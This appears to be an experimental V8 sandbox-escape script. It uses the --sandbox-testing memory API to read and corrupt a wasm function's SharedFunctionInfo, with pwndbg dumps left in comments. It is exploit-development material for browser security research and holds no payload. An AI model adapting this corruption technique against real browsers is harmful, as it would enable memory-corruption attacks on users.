// r --expose-gc --allow-natives-syntax --sandbox-testing ../../../tests/t6.js

let sandboxMemory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function addrOf(obj) {
return Sandbox.getAddressOf(obj);
}

function v8_read64(addr) {
return sandboxMemory.getBigUint64(Number(addr), true);
}

function v8_write64(addr, val) {
return sandboxMemory.setBigInt64(Number(addr), val, true);
}

function v8_read32(addr) {
    // return sandboxMemory.getBigUint32(Number(addr), true);
    return BigInt(sandboxMemory.getUint32(Number(addr), true));
    }

function v8_write32(addr, val) {
// return sandboxMemory.setBigInt32(Number(addr), val, true);
return sandboxMemory.setUint32(Number(addr), val, true);
}

//============================================================================

const memory = new WebAssembly.Memory({ initial: 1, maximum: 256, shared: true});
console.log("====================================================================");
// Read the Wasm file
const wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 11, 2, 96, 2, 127, 127, 0, 96, 1, 127, 1, 127, 3, 3, 2, 0, 1, 5, 3, 1, 0, 1, 7, 25, 3, 6, 109, 101, 109, 111, 114, 121, 2, 0, 5, 115, 116, 111, 114, 101, 0, 0, 4, 108, 111, 97, 100, 0, 1, 10, 19, 2, 9, 0, 32, 0, 32, 1, 54, 2, 0, 11, 7, 0, 32, 0, 40, 2, 0, 11]);

var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod, {env: { memory: memory }});
const store = wasm_instance.exports.store;
const load = wasm_instance.exports.load;

store(0, 0x41); // Store the value 42 at address 0
// console.log(load(0)); // Load the value at address 0

%DebugPrint(store);
console.log("=====================================================================");
let dummy = new Int8Array(150);
%DebugPrint(dummy);


let v8_heap_base = v8_read64(0x48) - 0x40000n;
let store_sfi = v8_read64(addrOf(store) + 0x10) & 0xffffffffn;
// let load_sfi = v8_read64(addrOf(load) + 0x10) & 0xffffffffn;
console.log("v8_heap_base: 0x" + v8_heap_base.toString(16));
console.log("store_sfi: 0x" + store_sfi.toString(16));
// console.log("load_sfi: 0x" + load_sfi.toString(16));

// for (let i =0; i<40; i++){
//     v8_write64(store_sfi-1n+BigInt(i)*4n, 0x41414141n + BigInt(i));
// }

// v8_write64(store_sfi-1n+0x30n, 0x41414145n); 

/*
shared_info: 0x2e720029a715
pwndbg> x/10wx 0x2e720029a715-1+0x30
0x2e720029a744:	0x002926fd	0x00000725	0x00000725	0x002bf801
0x2e720029a754:	0x0029a715	0x00281729	0x001400a9	0x0029a6a5
// ==============================================================

RCX  0x2e72002926fd
    movzx  edx, word ptr [rcx + 7]
pwndbg> x/10wx 0x2e72002926fd-1
0x2e72002926fc:	0x002816d9	0x2e070707	0x0d020811	0x084013ff

   0x7fff7f484294    lea    r10d, [rdx - 0x811]
   0x7fff7f48429b    cmp    r10d, 0xf
   0x7fff7f48429f    jbe    0x7fff7f482d00                <0x7fff7f482d00>

*/

let addr2 = v8_read32(store_sfi-1n+0x30n);
let data2 = v8_read32(addr2-1n +8n); // function_data 
console.log("data2: 0x" + data2.toString(16));
/* 
  Tagged<Object> handler =
      constructor->shared()->api_func_data()->GetInstanceCallHandler();
*/

// let addr3 = v8_read64(load_sfi-1n+0x30n) & 0xffffffffn;
// let original2 = v8_read64(addr3+7n);

console.log(v8_read64(store_sfi - 7n).toString(16));
v8_write32(store_sfi - 7n, 0xffffffff);
console.log(v8_read64(store_sfi - 7n).toString(16));


%SystemBreak();
store(1, 0x42);
// load(1);